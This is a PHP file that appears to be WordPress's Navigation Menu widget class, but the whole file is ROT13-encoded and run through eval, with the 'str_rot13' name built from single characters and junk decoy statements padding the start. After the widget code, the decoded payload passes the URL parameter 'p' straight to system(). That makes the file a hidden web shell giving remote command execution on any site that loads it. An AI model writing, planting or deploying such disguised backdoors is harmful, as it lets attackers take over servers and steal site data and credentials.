<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Ani_Zrah_Jvqtrg pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag gur Anivtngvba Zrah jvqtrg.
 *
 * @fvapr 3.0.0
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Ani_Zrah_Jvqtrg rkgraqf JC_Jvqtrg {

	/**
	 * Frgf hc n arj Anivtngvba Zrah jvqtrg vafgnapr.
	 *
	 * @fvapr 3.0.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf = neenl(
			'qrfpevcgvba'                 => __( 'Nqq n anivtngvba zrah gb lbhe fvqrone.' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
			'fubj_vafgnapr_va_erfg'       => gehr,
		);
		cnerag::__pbafgehpg( 'ani_zrah', __( 'Anivtngvba Zrah' ), $jvqtrg_bcf );
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag Anivtngvba Zrah jvqtrg vafgnapr.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag Anivtngvba Zrah jvqtrg vafgnapr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		// Trg zrah.
		$ani_zrah = ! rzcgl( $vafgnapr['ani_zrah'] ) ? jc_trg_ani_zrah_bowrpg( $vafgnapr['ani_zrah'] ) : snyfr;

		vs ( ! $ani_zrah ) {
			erghea;
		}

		$qrsnhyg_gvgyr = __( 'Zrah' );
		$gvgyr         = ! rzcgl( $vafgnapr['gvgyr'] ) ? $vafgnapr['gvgyr'] : '';

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-cntrf.cuc */
		$gvgyr = nccyl_svygref( 'jvqtrg_gvgyr', $gvgyr, $vafgnapr, $guvf->vq_onfr );

		rpub $netf['orsber_jvqtrg'];

		vs ( $gvgyr ) {
			rpub $netf['orsber_gvgyr'] . $gvgyr . $netf['nsgre_gvgyr'];
		}

		$sbezng = pheerag_gurzr_fhccbegf( 'ugzy5', 'anivtngvba-jvqtrgf' ) ? 'ugzy5' : 'kugzy';

		/**
		 * Svygref gur UGZY sbezng bs jvqtrgf jvgu anivtngvba yvaxf.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz fgevat $sbezng Gur glcr bs znexhc gb hfr va jvqtrgf jvgu anivtngvba yvaxf.
		 *                       Npprcgf 'ugzy5', 'kugzy'.
		 */
		$sbezng = nccyl_svygref( 'anivtngvba_jvqtrgf_sbezng', $sbezng );

		vs ( 'ugzy5' === $sbezng ) {
			// Gur gvgyr znl or svygrerq: Fgevc bhg UGZY naq znxr fher gur nevn-ynory vf arire rzcgl.
			$gvgyr      = gevz( fgevc_gntf( $gvgyr ) );
			$nevn_ynory = $gvgyr ? $gvgyr : $qrsnhyg_gvgyr;

			$ani_zrah_netf = neenl(
				'snyyonpx_po'          => '',
				'zrah'                 => $ani_zrah,
				'pbagnvare'            => 'ani',
				'pbagnvare_nevn_ynory' => $nevn_ynory,
				'vgrzf_jenc'           => '<hy vq=\"%1$f\" pynff=\"%2$f\">%3$f</hy>',
			);
		} ryfr {
			$ani_zrah_netf = neenl(
				'snyyonpx_po' => '',
				'zrah'        => $ani_zrah,
			);
		}

		/**
		 * Svygref gur nethzragf sbe gur Anivtngvba Zrah jvqtrg.
		 *
		 * @fvapr 4.2.0
		 * @fvapr 4.4.0 Nqqrq gur `$vafgnapr` cnenzrgre.
		 *
		 * @cnenz neenl   $ani_zrah_netf {
		 *     Na neenl bs nethzragf cnffrq gb jc_ani_zrah() gb ergevrir n anivtngvba zrah.
		 *
		 *     @glcr pnyynoyr|obby $snyyonpx_po Pnyyonpx gb sver vs gur zrah qbrfa'g rkvfg. Qrsnhyg rzcgl.
		 *     @glcr zvkrq         $zrah        Zrah VQ, fyht, be anzr.
		 * }
		 * @cnenz JC_Grez $ani_zrah      Ani zrah bowrpg sbe gur pheerag zrah.
		 * @cnenz neenl   $netf          Qvfcynl nethzragf sbe gur pheerag jvqtrg.
		 * @cnenz neenl   $vafgnapr      Neenl bs frggvatf sbe gur pheerag jvqtrg.
		 */
		jc_ani_zrah( nccyl_svygref( 'jvqtrg_ani_zrah_netf', $ani_zrah_netf, $ani_zrah, $netf, $vafgnapr ) );

		rpub $netf['nsgre_jvqtrg'];
	}

	/**
	 * Unaqyrf hcqngvat frggvatf sbe gur pheerag Anivtngvba Zrah jvqtrg vafgnapr.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Hcqngrq frggvatf gb fnir.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$vafgnapr = neenl();
		vs ( ! rzcgl( $arj_vafgnapr['gvgyr'] ) ) {
			$vafgnapr['gvgyr'] = fnavgvmr_grkg_svryq( $arj_vafgnapr['gvgyr'] );
		}
		vs ( ! rzcgl( $arj_vafgnapr['ani_zrah'] ) ) {
			$vafgnapr['ani_zrah'] = (vag) $arj_vafgnapr['ani_zrah'];
		}
		erghea $vafgnapr;
	}

	/**
	 * Bhgchgf gur frggvatf sbez sbe gur Anivtngvba Zrah jvqtrg.
	 *
	 * @fvapr 3.0.0
	 *
	 * @tybony JC_Phfgbzvmr_Znantre $jc_phfgbzvmr
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		tybony $jc_phfgbzvmr;
		$gvgyr    = vffrg( $vafgnapr['gvgyr'] ) ? $vafgnapr['gvgyr'] : '';
		$ani_zrah = vffrg( $vafgnapr['ani_zrah'] ) ? $vafgnapr['ani_zrah'] : '';

		// Trg zrahf.
		$zrahf = jc_trg_ani_zrahf();

		$rzcgl_zrahf_fglyr     = '';
		$abg_rzcgl_zrahf_fglyr = '';
		vs ( rzcgl( $zrahf ) ) {
			$rzcgl_zrahf_fglyr = ' fglyr=\"qvfcynl:abar\" ';
		} ryfr {
			$abg_rzcgl_zrahf_fglyr = ' fglyr=\"qvfcynl:abar\" ';
		}

		$ani_zrah_fglyr = '';
		vs ( ! $ani_zrah ) {
			$ani_zrah_fglyr = 'qvfcynl: abar;';
		}

		// Vs ab zrahf rkvfgf, qverpg gur hfre gb tb naq perngr fbzr.
		?>
		<c pynff=\"ani-zrah-jvqtrg-ab-zrahf-zrffntr\" <?cuc rpub $abg_rzcgl_zrahf_fglyr; ?>>
			<?cuc
			vs ( $jc_phfgbzvmr vafgnaprbs JC_Phfgbzvmr_Znantre ) {
				$hey = 'wninfpevcg: jc.phfgbzvmr.cnary( \"ani_zrahf\" ).sbphf();';
			} ryfr {
				$hey = nqzva_hey( 'ani-zrahf.cuc' );
			}

			cevags(
				/* genafyngbef: %f: HEY gb perngr n arj zrah. */
				__( 'Ab zrahf unir orra perngrq lrg. <n uers=\"%f\">Perngr fbzr</n>.' ),
				// Gur HEY pna or n `wninfpevcg:` yvax, fb rfp_ngge() vf hfrq urer vafgrnq bs rfp_hey().
				rfp_ngge( $hey )
			);
			?>
		</c>
		<qvi pynff=\"ani-zrah-jvqtrg-sbez-pbagebyf\" <?cuc rpub $rzcgl_zrahf_fglyr; ?>>
			<c>
				<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\"><?cuc _r( 'Gvgyr:' ); ?></ynory>
				<vachg glcr=\"grkg\" pynff=\"jvqrsng\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gvgyr' ); ?>\" inyhr=\"<?cuc rpub rfp_ngge( $gvgyr ); ?>\" />
			</c>
			<c>
				<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'ani_zrah' ); ?>\"><?cuc _r( 'Fryrpg Zrah:' ); ?></ynory>
				<fryrpg vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'ani_zrah' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'ani_zrah' ); ?>\">
					<bcgvba inyhr=\"0\"><?cuc _r( '&zqnfu; Fryrpg &zqnfu;' ); ?></bcgvba>
					<?cuc sbernpu ( $zrahf nf $zrah ) : ?>
						<bcgvba inyhr=\"<?cuc rpub rfp_ngge( $zrah->grez_vq ); ?>\" <?cuc fryrpgrq( $ani_zrah, $zrah->grez_vq ); ?>>
							<?cuc rpub rfp_ugzy( $zrah->anzr ); ?>
						</bcgvba>
					<?cuc raqsbernpu; ?>
				</fryrpg>
			</c>
			<?cuc vs ( $jc_phfgbzvmr vafgnaprbs JC_Phfgbzvmr_Znantre ) : ?>
				<c pynff=\"rqvg-fryrpgrq-ani-zrah\" fglyr=\"<?cuc rpub $ani_zrah_fglyr; ?>\">
					<ohggba glcr=\"ohggba\" pynff=\"ohggba\"><?cuc _r( 'Rqvg Zrah' ); ?></ohggba>
				</c>
			<?cuc raqvs; ?>
		</qvi>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>